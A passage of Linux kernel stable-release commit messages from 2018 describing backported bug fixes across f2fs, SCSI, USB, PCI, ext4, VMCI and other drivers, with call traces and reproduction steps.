Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 207093ca18c6bbbbf28d72277665fd3aa9ecdc04
Author: Zhikang Zhang
Date: Mon Sep 10 16:18:25 2018 +0800
f2fs: avoid sleeping under spin\_lock
[ Upstream commit b430f7263673eab1dc40e662ae3441a9619d16b8 ]
In the call trace below, we might sleep in function dput().
So in order to avoid sleeping under spin\_lock, we remove f2fs\_mark\_inode\_dirty\_sync
from \_\_try\_update\_largest\_extent && \_\_drop\_largest\_extent.
BUG: sleeping function called from invalid context at fs/dcache.c:796
Call trace:
dump\_backtrace+0x0/0x3f4
show\_stack+0x24/0x30
dump\_stack+0xe0/0x138
\_\_\_might\_sleep+0x2a8/0x2c8
\_\_might\_sleep+0x78/0x10c
dput+0x7c/0x750
block\_dump\_\_\_mark\_inode\_dirty+0x120/0x17c
\_\_mark\_inode\_dirty+0x344/0x11f0
f2fs\_mark\_inode\_dirty\_sync+0x40/0x50
\_\_insert\_extent\_tree+0x2e0/0x2f4
f2fs\_update\_extent\_tree\_range+0xcf4/0xde8
f2fs\_update\_extent\_cache+0x114/0x12c
f2fs\_update\_data\_blkaddr+0x40/0x50
write\_data\_page+0x150/0x314
do\_write\_data\_page+0x648/0x2318
\_\_write\_data\_page+0xdb4/0x1640
f2fs\_write\_cache\_pages+0x768/0xafc
\_\_f2fs\_write\_data\_pages+0x590/0x1218
f2fs\_write\_data\_pages+0x64/0x74
do\_writepages+0x74/0xe4
\_\_writeback\_single\_inode+0xdc/0x15f0
writeback\_sb\_inodes+0x574/0xc98
\_\_writeback\_inodes\_wb+0x190/0x204
wb\_writeback+0x730/0xf14
wb\_check\_old\_data\_flush+0x1bc/0x1c8
wb\_workfn+0x554/0xf74
process\_one\_work+0x440/0x118c
worker\_thread+0xac/0x974
kthread+0x1a0/0x1c8
ret\_from\_fork+0x10/0x1c
Signed-off-by: Zhikang Zhang
Reviewed-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f94fd45c75ee6b72e96b7e368aefc60d45d3d60d
Author: James Smart
Date: Mon Sep 10 10:30:44 2018 -0700
scsi: lpfc: Correct race with abort on completion path
[ Upstream commit ca7fb76e091f889cfda1287c07a9358f73832b39 ]
On io completion, the driver is taking an adapter wide lock and nulling the
scsi command back pointer. The nulling of the back pointer is to signify the
io was completed and the scsi\_done() routine was called. However, the routine
makes no check to see if the abort routine had done the same thing and
possibly nulled the pointer. Thus it may doubly-complete the io.
Make the following mods:
- Check to make sure forward progress (call scsi\_done()) only happens if the
command pointer was non-null.
- As the taking of the lock, which is adapter wide, is very costly on a system
under load, null the pointer using an xchg operation rather than under lock.
Signed-off-by: Dick Kennedy
Signed-off-by: James Smart
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 591e360bfb03dcf79c531eacaf8da76b2dda6c69
Author: James Smart
Date: Mon Sep 10 10:30:45 2018 -0700
scsi: lpfc: Correct soft lockup when running mds diagnostics
[ Upstream commit 0ef01a2d95fd62bb4f536e7ce4d5e8e74b97a244 ]
When running an mds diagnostic that passes frames with the switch, soft
lockups are detected. The driver is in a CQE processing loop and has
sufficient amount of traffic that it never exits the ring processing routine,
thus the "lockup".
Cap the number of elements in the work processing routine to 64 elements. This
ensures that the cpu will be given up and the handler reschedule to process
additional items.
Signed-off-by: Dick Kennedy
Signed-off-by: James Smart
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit c21099be02331a82c28a7bad1d956b6cd64a3782
Author: Alexandre Belloni
Date: Thu Aug 16 09:39:41 2018 +0200
uio: ensure class is registered before devices
[ Upstream commit ae61cf5b9913027c6953a79ed3894da4f47061bd ]
When both uio and the uio drivers are built in the kernel, it is possible
for a driver to register devices before the uio class is registered.
This may result in a NULL pointer dereference later on in
get\_device\_parent() when accessing the class glue\_dirs spinlock.
The trace looks like that:
Unable to handle kernel NULL pointer dereference at virtual address 00000140
[...]
[] \_raw\_spin\_lock+0x14/0x48
[] device\_add+0x154/0x6a0
[] device\_create\_groups\_vargs+0x120/0x128
[] device\_create+0x54/0x60
[] \_\_uio\_register\_device+0x120/0x4a8
[] jaguar2\_pci\_probe+0x2d4/0x558
[] local\_pci\_probe+0x3c/0xb8
[] pci\_device\_probe+0x11c/0x180
[] driver\_probe\_device+0x22c/0x2d8
[] \_\_driver\_attach+0xbc/0xc0
[] bus\_for\_each\_dev+0x4c/0x98
[] driver\_attach+0x20/0x28
[] bus\_add\_driver+0x1b8/0x228
[] driver\_register+0x60/0xf8
[] \_\_pci\_register\_driver+0x40/0x48
Return EPROBE\_DEFER in that case so the driver can register the device
later.
Signed-off-by: Alexandre Belloni
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3c1deb69a8e5ec21c815850ea6451d112fbc200b
Author: Moni Shoua
Date: Wed Sep 12 09:33:55 2018 +0300
IB/mlx5: Allow transition of DCI QP to reset
[ Upstream commit 99ed748e878a99c6c7b87bbec063eefd9e47cb42 ]
The transition is allowed from any state and the atrribute mask must be
IB\_QP\_STATE.
Fixes: c32a4f296e1d ("IB/mlx5: Add support for DC Initiator QP")
Signed-off-by: Moni Shoua
Reviewed-by: Artemy Kovalyov
Signed-off-by: Leon Romanovsky
Signed-off-by: Jason Gunthorpe
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 24d4d9a43f2624578367e4d3ee7950ed81d165ed
Author: Arseny Maslennikov
Date: Thu Sep 6 17:51:11 2018 +0300
IB/ipoib: Use dev\_port to expose network interface port numbers
[ Upstream commit 9b8b2a323008aedd39a8debb861b825707f01420 ]
Some InfiniBand network devices have multiple ports on the same PCI
function. This initializes the `dev\_port' sysfs field of those
network interfaces with their port number.
Prior to this the kernel erroneously used the `dev\_id' sysfs
field of those network interfaces to convey the port number to userspace.
The use of `dev\_id' was considered correct until Linux 3.15,
when another field, `dev\_port', was defined for this particular
purpose and `dev\_id' was reserved for distinguishing stacked ifaces
(e.g: VLANs) with the same hardware address as their parent device.
Similar fixes to net/mlx4\_en and many other drivers, which started
exporting this information through `dev\_id' before 3.15, were accepted
into the kernel 4 years ago.
See 76a066f2a2a0 (`net/mlx4\_en: Expose port number through sysfs').
Signed-off-by: Arseny Maslennikov
Signed-off-by: Doug Ledford
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1da803c62bf676bf4f34ec409e769c17113b8e6b
Author: Stephen Boyd
Date: Wed Aug 15 13:37:04 2018 -0700
firmware: coreboot: Unmap ioregion after device population
[ Upstream commit 20edec388277b62ddfddb8b2b376a937a2cd6d1b ]
Both callers of coreboot\_table\_init() ioremap the pointer that comes in
but they don't unmap the memory on failure. Both of them also fail probe
immediately with the return value of coreboot\_table\_init(), leaking a
mapping when it fails. The mapping isn't necessary at all after devices
are populated either, so we can just drop the mapping here when we exit
the function. Let's do that to simplify the code a bit and plug the leak.
Cc: Wei-Ning Huang
Cc: Julius Werner
Cc: Brian Norris
Cc: Samuel Holland
Fixes: 570d30c2823f ("firmware: coreboot: Expose the coreboot table as a bus")
Signed-off-by: Stephen Boyd
Reviewed-by: Julius Werner
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 16ae44a91f458482d7246b6bc780dcabbb46d187
Author: Akshu Agrawal
Date: Tue Sep 18 12:53:13 2018 +0530
ASoC: AMD: Fix capture unstable in beginning for some runs
[ Upstream commit c50535ed6a10fcae1b64ae83c0f6b1eeb5535afc ]
alsa\_conformance\_test -C hw:0,4 -p 1024 --debug
would sometime show:
TIME\_DIFF(s) HW\_LEVEL READ RATE
0.000095970 1024 1024 10670001.041992
0.042609555 1024 2048 24032.168372
0.021330364 1024 3072 48006.681930
0.021339559 1024 4096 47985.996337
The issue is that in dma pointer function we can have stale value
of the register for current descriptor of channel.
The register retains the number of the last descriptor that
was transferred.
Fix ensures that we report position, 0, till the one period worth of
data is transferred. After one period of data, in handler of period
completion interrupt we update the config and correct value of descriptor
starts reflecting.
Signed-off-by: Akshu Agrawal
Signed-off-by: Mark Brown
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 84a8404988933747556570b31cff995658cd8faf
Author: Waiman Long
Date: Fri Sep 14 14:53:32 2018 -0400
driver/dma/ioat: Call del\_timer\_sync() without holding prep\_lock
[ Upstream commit cfb03be6c7e8a1591285849c361d67b09f5149f7 ]
The following lockdep splat was observed:
[ 1222.241750] ======================================================
[ 1222.271301] WARNING: possible circular locking dependency detected
[ 1222.301060] 4.16.0-10.el8+5.x86\_64+debug #1 Not tainted
[ 1222.326659] ------------------------------------------------------
[ 1222.356565] systemd-shutdow/1 is trying to acquire lock:
[ 1222.382660] ((&ioat\_chan->timer)){+.-.}, at: [<00000000f71e1a28>] del\_timer\_sync+0x5/0xf0
[ 1222.422928]
[ 1222.422928] but task is already holding lock:
[ 1222.451743] (&(&ioat\_chan->prep\_lock)->rlock){+.-.}, at: [<000000008ea98b12>] ioat\_shutdown+0x86/0x100 [ioatdma]
:
[ 1223.524987] Chain exists of:
[ 1223.524987] (&ioat\_chan->timer) --> &(&ioat\_chan->cleanup\_lock)->rlock --> &(&ioat\_chan->prep\_lock)->rlock
[ 1223.524987]
[ 1223.594082] Possible unsafe locking scenario:
[ 1223.594082]
[ 1223.622630] CPU0 CPU1
[ 1223.645080] ---- ----
[ 1223.667404] lock(&(&ioat\_chan->prep\_lock)->rlock);
[ 1223.691535] lock(&(&ioat\_chan->cleanup\_lock)->rlock);
[ 1223.728657] lock(&(&ioat\_chan->prep\_lock)->rlock);
[ 1223.765122] lock((&ioat\_chan->timer));
[ 1223.784095]
[ 1223.784095] \*\*\* DEADLOCK \*\*\*
[ 1223.784095]
[ 1223.813492] 4 locks held by systemd-shutdow/1:
[ 1223.834677] #0: (reboot\_mutex){+.+.}, at: [<0000000056d33456>] SYSC\_reboot+0x10f/0x300
[ 1223.873310] #1: (&dev->mutex){....}, at: [<00000000258dfdd7>] device\_shutdown+0x1c8/0x660
[ 1223.913604] #2: (&dev->mutex){....}, at: [<0000000068331147>] device\_shutdown+0x1d6/0x660
[ 1223.954000] #3: (&(&ioat\_chan->prep\_lock)->rlock){+.-.}, at: [<000000008ea98b12>] ioat\_shutdown+0x86/0x100 [ioatdma]
In the ioat\_shutdown() function:
spin\_lock\_bh(&ioat\_chan->prep\_lock);
set\_bit(IOAT\_CHAN\_DOWN, &ioat\_chan->state);
del\_timer\_sync(&ioat\_chan->timer);
spin\_unlock\_bh(&ioat\_chan->prep\_lock);
According to the synchronization rule for the del\_timer\_sync() function,
the caller must not hold locks which would prevent completion of the
timer's handler.
The timer structure has its own lock that manages its synchronization.
Setting the IOAT\_CHAN\_DOWN bit should prevent other CPUs from
trying to use that device anyway, there is probably no need to call
del\_timer\_sync() while holding the prep\_lock. So the del\_timer\_sync()
call is now moved outside of the prep\_lock critical section to prevent
the circular lock dependency.
Signed-off-by: Waiman Long
Reviewed-by: Dave Jiang
Signed-off-by: Vinod Koul
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 7a478552b563d7c66525c2d6274bb9f1e030d6db
Author: Casey Schaufler
Date: Tue Sep 18 16:09:16 2018 -0700
Smack: ptrace capability use fixes
[ Upstream commit dcb569cf6ac99ca899b8109c128b6ae52477a015 ]
This fixes a pair of problems in the Smack ptrace checks
related to checking capabilities. In both cases, as reported
by Lukasz Pawelczyk, the raw capability calls are used rather
than the Smack wrapper that check addition restrictions.
In one case, as reported by Jann Horn, the wrong task is being
checked for capabilities.
Signed-off-by: Casey Schaufler
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit eb4a3faebfd113482ea3c266f7d30e13f7d56848
Author: Loic Poulain
Date: Tue Sep 4 17:18:57 2018 +0200
usb: chipidea: Prevent unbalanced IRQ disable
[ Upstream commit 8b97d73c4d72a2abf58f8e49062a7ee1e5f1334e ]
The ChipIdea IRQ is disabled before scheduling the otg work and
re-enabled on otg work completion. However if the job is already
scheduled we have to undo the effect of disable\_irq int order to
balance the IRQ disable-depth value.
Fixes: be6b0c1bd0be ("usb: chipidea: using one inline function to cover queue work operations")
Signed-off-by: Loic Poulain
Signed-off-by: Peter Chen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 451738900f881a0b785ac905847552da760ab521
Author: Horia Geantă
Date: Wed Sep 12 11:59:30 2018 +0300
crypto: caam - fix implicit casts in endianness helpers
[ Upstream commit aae733a3f46f5ef338fbdde26e14cbb205a23de0 ]
Fix the following sparse endianness warnings:
drivers/crypto/caam/regs.h:95:1: sparse: incorrect type in return expression (different base types) @@ expected unsigned int @@ got restricted \_\_le32unsigned int @@
drivers/crypto/caam/regs.h:95:1: expected unsigned int
drivers/crypto/caam/regs.h:95:1: got restricted \_\_le32 [usertype]
drivers/crypto/caam/regs.h:95:1: sparse: incorrect type in return expression (different base types) @@ expected unsigned int @@ got restricted \_\_be32unsigned int @@
drivers/crypto/caam/regs.h:95:1: expected unsigned int
drivers/crypto/caam/regs.h:95:1: got restricted \_\_be32 [usertype]
drivers/crypto/caam/regs.h:92:1: sparse: cast to restricted \_\_le32
drivers/crypto/caam/regs.h:92:1: sparse: cast to restricted \_\_be32
Fixes: 261ea058f016 ("crypto: caam - handle core endianness != caam endianness")
Reported-by: kbuild test robot
Signed-off-by: Horia Geantă
Signed-off-by: Herbert Xu
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 653f6e544e7156c553aeff7678e5e66211d9dbd9
Author: Vignesh R
Date: Tue Sep 25 14:00:24 2018 +0530
PCI: dwc: pci-dra7xx: Enable errata i870 for both EP and RC mode
[ Upstream commit 726d75a6d243bf6730da3216f3592503f6f0f588 ]
Errata i870 is applicable in both EP and RC mode. Therefore rename
function dra7xx\_pcie\_ep\_unaligned\_memaccess(), that implements errata
workaround, to dra7xx\_pcie\_unaligned\_memaccess() and call it for both RC
and EP. Make sure driver probe does not fail in case the workaround is not
applied for RC mode in order to maintain DT backward compatibility.
Reported-by: Chris Welch
Signed-off-by: Vignesh R
[lorenzo.pieralisi@arm.com: reworded the log]
Signed-off-by: Lorenzo Pieralisi
Acked-by: Kishon Vijay Abraham I
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3fa9b782dfc4a5acf888b61274388590b458100e
Author: Suzuki K Poulose
Date: Thu Sep 20 13:17:46 2018 -0600
coresight: etb10: Fix handling of perf mode
[ Upstream commit 987d1e8dcd370d96029a3d76a0031b043c4a69ae ]
If the ETB is already enabled in sysfs mode, the ETB reports
success even if a perf mode is requested. Fix this by checking
the requested mode.
Cc: Mathieu Poirier
Signed-off-by: Suzuki K Poulose
Signed-off-by: Mathieu Poirier
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f17c179522805ebc530fd9196a82ee22a877a7f4
Author: Tonghao Zhang
Date: Mon Sep 24 07:00:41 2018 -0700
PCI/MSI: Warn and return error if driver enables MSI/MSI-X twice
[ Upstream commit 4c1ef72e9b71a19fb405ebfcd37c0a5e16fa44ca ]
It is a serious driver defect to enable MSI or MSI-X more than once. Doing
so may panic the kernel as in the stack trace below:
Call Trace:
sysfs\_add\_one+0xa5/0xd0
create\_dir+0x7c/0xe0
sysfs\_create\_subdir+0x1c/0x20
internal\_create\_group+0x6d/0x290
sysfs\_create\_groups+0x4a/0xa0
populate\_msi\_sysfs+0x1cd/0x210
pci\_enable\_msix+0x31c/0x3e0
igbuio\_pci\_open+0x72/0x300 [igb\_uio]
uio\_open+0xcc/0x120 [uio]
chrdev\_open+0xa1/0x1e0
[...]
do\_sys\_open+0xf3/0x1f0
SyS\_open+0x1e/0x20
system\_call\_fastpath+0x16/0x1b
---[ end trace 11042e2848880209 ]---
Kernel panic - not syncing: stack-protector: Kernel stack is corrupted in: ffffffffa056b4fa
We want to keep the WARN\_ON() and stack trace so the driver can be fixed,
but we can avoid the kernel panic by returning an error. We may still get
warnings like this:
Call Trace:
pci\_enable\_msix+0x3c9/0x3e0
igbuio\_pci\_open+0x72/0x300 [igb\_uio]
uio\_open+0xcc/0x120 [uio]
chrdev\_open+0xa1/0x1e0
[...]
do\_sys\_open+0xf3/0x1f0
SyS\_open+0x1e/0x20
system\_call\_fastpath+0x16/0x1b
------------[ cut here ]------------
WARNING: at fs/sysfs/dir.c:526 sysfs\_add\_one+0xa5/0xd0()
sysfs: cannot create duplicate filename '/devices/pci0000:00/0000:00:03.0/0000:01:00.1/msi\_irqs'
Signed-off-by: Tonghao Zhang
[bhelgaas: changelog, fix patch whitespace, remove !!]
Signed-off-by: Bjorn Helgaas
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit b1097eb9f0d4b455170705f5146eea800313ed55
Author: Chao Yu
Date: Tue Sep 25 15:35:59 2018 +0800
f2fs: fix to recover inode's i\_flags during POR
[ Upstream commit 19c73a691ccf6fb2f12d4e9cf9830023966cec88 ]
Testcase to reproduce this bug:
1. mkfs.f2fs /dev/sdd
2. mount -t f2fs /dev/sdd /mnt/f2fs
3. touch /mnt/f2fs/file
4. sync
5. chattr +A /mnt/f2fs/file
6. xfs\_io -f /mnt/f2fs/file -c "fsync"
7. godown /mnt/f2fs
8. umount /mnt/f2fs
9. mount -t f2fs /dev/sdd /mnt/f2fs
10. lsattr /mnt/f2fs/file
-----------------N- /mnt/f2fs/file
But actually, we expect the corrct result is:
-------A---------N- /mnt/f2fs/file
The reason is we didn't recover inode.i\_flags field during mount,
fix it.
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 5ce5de034a3c8e1f85ee51eb70f3e145a6104410
Author: Chao Yu
Date: Tue Sep 25 15:36:01 2018 +0800
f2fs: fix to recover inode's crtime during POR
[ Upstream commit 5cd1f387a13b5188b4edb4c834310302a85a6ea2 ]
Testcase to reproduce this bug:
1. mkfs.f2fs -O extra\_attr -O inode\_crtime /dev/sdd
2. mount -t f2fs /dev/sdd /mnt/f2fs
3. touch /mnt/f2fs/file
4. xfs\_io -f /mnt/f2fs/file -c "fsync"
5. godown /mnt/f2fs
6. umount /mnt/f2fs
7. mount -t f2fs /dev/sdd /mnt/f2fs
8. xfs\_io -f /mnt/f2fs/file -c "statx -r"
stat.btime.tv\_sec = 0
stat.btime.tv\_nsec = 0
This patch fixes to recover inode creation time fields during
mount.
Signed-off-by: Chao Yu
Signed-off-by: Jaegeuk Kim
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 4d50bad1389194da18c028fb50426e3e5256127a
Author: Quinn Tran
Date: Wed Sep 26 22:05:16 2018 -0700
scsi: qla2xxx: Fix recursive mailbox timeout
[ Upstream commit 710bc78f829d014eca95ed7ccc4052bc064b1320 ]
This patch prevents user space mailbox request from doing chip reset if the
mailbox timed out. The chip reset is only reserved for the DPC thread to
ensure all mailbox requests are flushed properly. The DPC thread is
responsible for the flushing all MBs and chip reset.
Fixes: b2000805a975 ("scsi: qla2xxx: Flush mailbox commands on chip reset")
Cc:
Signed-off-by: Quinn Tran
Reviewed-by: Ewan D. Milne
Signed-off-by: Himanshu Madhani
Signed-off-by: Martin K. Petersen
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 974c4312604d8758c3fc71ad0cc445ddd99ff5d3
Author: Anshuman Gupta
Date: Thu Sep 20 19:13:40 2018 +0300
xhci: Avoid USB autosuspend when resuming USB2 ports.
[ Upstream commit 330e2d61cdd58363eb5e66b2e72f76fe3c5492e0 ]
When USB bus host controller root hub resumes from autosuspend,
it immediately tries to enter auto-suspend, but there can be a
scenario when root hub is resuming its usb2 ports, in that particular
case USB host controller auto suspend fails since it is busy
to resuming its usb2 ports.
This makes multiple failed cycles of auto-suspend until all usb2
ports of host controller root hub do not resume.
This patch uses USB core framework usb\_hcd\_start\_port\_resume,
usb\_hcd\_end\_port\_resume API's in order to autoresume/autosuspend
root hub properly.
Signed-off-by: Anshuman Gupta
Signed-off-by: Mathias Nyman
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1cddd3e45ec77dbd8be153b76f950e35d577cf5e
Author: Bartosz Golaszewski
Date: Fri Sep 21 06:40:07 2018 -0700
nvmem: check the return value of nvmem\_add\_cells()
[ Upstream commit fa72d847d68d7833b77a4bef944cf2c5baf56f49 ]
This function can fail so check its return value in nvmem\_register()
and act accordingly.
Signed-off-by: Bartosz Golaszewski
Signed-off-by: Srinivas Kandagatla
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit f7087a371d7106b77612aeebb354ceeff8ec77ec
Author: Alan Douglas
Date: Fri Sep 28 11:51:18 2018 +0100
PCI: cadence: Correct probe behaviour when failing to get PHY
[ Upstream commit aa77e55d48124d0d78456eabf872fffb5decdbe1 ]
Test the correct value to see whether the PHY get failed.
Use devm\_phy\_get() instead of devm\_phy\_optional\_get(), since it is
only called if phy name is given in devicetree and so should exist.
If failure when getting or linking PHY, put any PHYs which were
already got and unlink them.
Fixes: dfb80534692ddc5b ("PCI: cadence: Add generic PHY support to host and EP drivers")
Reported-by: Colin King
Signed-off-by: Alan Douglas
Signed-off-by: Lorenzo Pieralisi
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 6596e997745c4b434b688e9d4c6f737648efd981
Author: Shaohua Li
Date: Mon Oct 1 18:36:36 2018 -0700
MD: fix invalid stored role for a disk
[ Upstream commit d595567dc4f0c1d90685ec1e2e296e2cad2643ac ]
If we change the number of array's device after device is removed from array,
then add the device back to array, we can see that device is added as active
role instead of spare which we expected.
Please see the below link for details:
https://marc.info/?l=linux-raid&m=153736982015076&w=2
This is caused by that we prefer to use device's previous role which is
recorded by saved\_raid\_disk, but we should respect the new number of
conf->raid\_disks since it could be changed after device is removed.
Reported-by: Gioh Kim
Tested-by: Gioh Kim
Acked-by: Guoqing Jiang
Signed-off-by: Shaohua Li
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3d267c56c75c9304d0b6cc9d0f129fbf4a835b07
Author: Theodore Ts'o
Date: Tue Oct 2 01:34:44 2018 -0400
ext4: fix argument checking in EXT4\_IOC\_MOVE\_EXT
[ Upstream commit f18b2b83a727a3db208308057d2c7945f368e625 ]
If the starting block number of either the source or destination file
exceeds the EOF, EXT4\_IOC\_MOVE\_EXT should return EINVAL.
Also fixed the helper function mext\_check\_coverage() so that if the
logical block is beyond EOF, make it return immediately, instead of
looping until the block number wraps all the away around. This takes
long enough that if there are multiple threads trying to do pound on
an the same inode doing non-sensical things, it can end up triggering
the kernel's soft lockup detector.
Reported-by: syzbot+c61979f6f2cba5cb3c06@syzkaller.appspotmail.com
Signed-off-by: Theodore Ts'o
Cc: stable@kernel.org
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 80fd75d30e576e8f219c6b3e6e54d133e909227a
Author: Alexandre Belloni
Date: Mon Sep 10 22:12:49 2018 +0200
usb: gadget: udc: atmel: handle at91sam9rl PMC
[ Upstream commit bb80e4fa57eb75ebd64ae9be4155da6d12c1a997 ]
The at91sam9rl PMC is not quite the same as the at91sam9g45 one and now has
its own compatible string. Add support for that.
Fixes: 217bace8e548 ("ARM: dts: fix PMC compatible")
Acked-by: Cristian Birsan
Signed-off-by: Alexandre Belloni
Signed-off-by: Felipe Balbi
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 3d9fb06c4623a147f41da83c6cc4fdad1b61c37f
Author: Fabrice Gasnier
Date: Wed Sep 5 13:40:03 2018 +0200
usb: dwc2: fix a race with external vbus supply
[ Upstream commit 41ee1ea21052583eaf5487dfa0d0c907c9667548 ]
There's a race with root hub resume, when using external vbus supply.
Root hub gets resumed, but runtime pm autosuspend runs as external vbus
supply isn't enabled. So, host never exit from power down properly.
Initialize vbus external supply before, rater that after hub resume.
Fixes: 531ef5ebea96 ("usb: dwc2: add support for host mode external
vbus supply")
Tested-by: Artur Petrosyan
Acked-by: Minas Harutyunyan
Signed-off-by: Fabrice Gasnier
Signed-off-by: Amelie Delaunay
Signed-off-by: Felipe Balbi
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 44e130f9779895ecce77b7ccfc4a6ef1dc734ac0
Author: Fabrice Gasnier
Date: Wed Sep 5 13:40:04 2018 +0200
usb: dwc2: fix call to vbus supply exit routine, call it unlocked
[ Upstream commit 5aa678c7fd5371769efde30763fb43a43a118cd0 ]
dwc2\_vbus\_supply\_exit() may call regulator\_disable(). It shouldn't be
called with interrupts disabled as it might sleep.
This is seen with DEBUG\_ATOMIC\_SLEEP=y.
Fixes: 531ef5ebea96 ("usb: dwc2: add support for host mode external
vbus supply")
Tested-by: Artur Petrosyan
Acked-by: Minas Harutyunyan
Signed-off-by: Fabrice Gasnier
Signed-off-by: Amelie Delaunay
Signed-off-by: Felipe Balbi
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 106d970ba5c84b6c61a706f9b13ff0d336500d31
Author: Lina Iyer
Date: Thu Sep 27 11:18:10 2018 -0600
irqchip/pdc: Setup all edge interrupts as rising edge at GIC
[ Upstream commit 7bae48b22c8d38c5cd50f52b6e15d134e2bb3935 ]
The PDC irqchp can convert a falling edge or level low interrupt to a
rising edge or level high interrupt at the GIC. We just need to setup
the GIC correctly. Set up the interrupt type for the IRQ\_TYPE\_EDGE\_BOTH
as IRQ\_TYPE\_EDGE\_RISING at the GIC.
Fixes: f55c73aef890 ("irqchip/pdc: Add PDC interrupt controller for QCOM SoCs")
Reported-by: Evan Green
Reviewed-by: Evan Green
Signed-off-by: Lina Iyer
Signed-off-by: Marc Zyngier
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 5fac1c6ccc3ce3c8b13312f0e412548e41eb8af6
Author: Chuck Lever
Date: Mon Oct 1 14:25:14 2018 -0400
xprtrdma: Reset credit grant properly after a disconnect
[ Upstream commit ef739b2175dde9c05594f768cb78149f1ce2ac36 ]
On a fresh connection, an RPC/RDMA client is supposed to send only
one RPC Call until it gets a credit grant in the first RPC Reply
from the server [RFC 8166, Section 3.3.3].
There is a bug in the Linux client's credit accounting mechanism
introduced by commit e7ce710a8802 ("xprtrdma: Avoid deadlock when
credit window is reset"). On connect, it simply dumps all pending
RPC Calls onto the new connection.
Servers have been tolerant of this bad behavior. Currently no server
implementation ever changes its credit grant over reconnects, and
servers always repost enough Receives before connections are fully
established.
To correct this issue, ensure that the client resets both the credit
grant \_and\_ the congestion window when handling a reconnect.
Fixes: e7ce710a8802 ("xprtrdma: Avoid deadlock when credit ... ")
Signed-off-by: Chuck Lever
Cc: stable@kernel.org
Signed-off-by: Anna Schumaker
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 1997aecd1a24cf053ebc5dd89d48b4d75da6afe5
Author: Mika Westerberg
Date: Thu Sep 27 16:54:13 2018 -0500
PCI / ACPI: Enable wake automatically for power managed bridges
[ Upstream commit 6299cf9ec3985cac70bede8a855b5087b81a6640 ]
We enable power management automatically for bridges where
pci\_bridge\_d3\_possible() returns true. However, these bridges may have
ACPI methods such as \_DSW that need to be called before D3 entry. For
example in Lenovo Thinkpad X1 Carbon 6th \_DSW method is used to prepare
D3cold for the PCIe root port hosting Thunderbolt chain. Because wake is
not enabled \_DSW method is never called and the port does not enter
D3cold properly consuming more power than necessary.
Users can work this around by writing "enabled" to "wakeup" sysfs file
under the device in question but that is not something an ordinary user
is expected to do.
Since we already automatically enable power management for PCIe ports
with ->bridge\_d3 set extend that to enable wake for them as well,
assuming the port has any ACPI wakeup related objects implemented in the
namespace (adev->wakeup.flags.valid is true). This ensures the necessary
ACPI methods get called at appropriate times and allows the root port in
Thinkpad X1 Carbon 6th to go into D3cold.
Signed-off-by: Mika Westerberg
Signed-off-by: Bjorn Helgaas
Reviewed-by: Rafael J. Wysocki
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 894e62f5e5fb0b6e8d0e3026178707facfe963ef
Author: Jorgen Hansen
Date: Fri Sep 21 00:31:05 2018 -0700
VMCI: Resource wildcard match fixed
[ Upstream commit 11924ba5e671d6caef1516923e2bd8c72929a3fe ]
When adding a VMCI resource, the check for an existing entry
would ignore that the new entry could be a wildcard. This could
result in multiple resource entries that would match a given
handle. One disastrous outcome of this is that the
refcounting used to ensure that delayed callbacks for VMCI
datagrams have run before the datagram is destroyed can be
wrong, since the refcount could be increased on the duplicate
entry. This in turn leads to a use after free bug. This issue
was discovered by Hangbin Liu using KASAN and syzkaller.
Fixes: bc63dedb7d46 ("VMCI: resource object implementation")
Reported-by: Hangbin Liu
Reviewed-by: Adit Ranadive
Reviewed-by: Vishnu Dasa
Signed-off-by: Jorgen Hansen
Signed-off-by: Greg Kroah-Hartman
Signed-off-by: Sasha Levin
Signed-off-by: Greg Kroah-Hartman
commit 56628c1936aea563d3e4e2eaddb2efb4a0acdc87
Author: Dexuan Cui
Date: Sun Sep 23 21:10:44 2018 +0000
Drivers: hv: vmbus: Use cpumask\_var\_t for on-stack cpu mask
[ Upstream commit 25355252607ca288f329ee033f387764883393f6 ]
A cpumask structure on the stack can cause a warning with
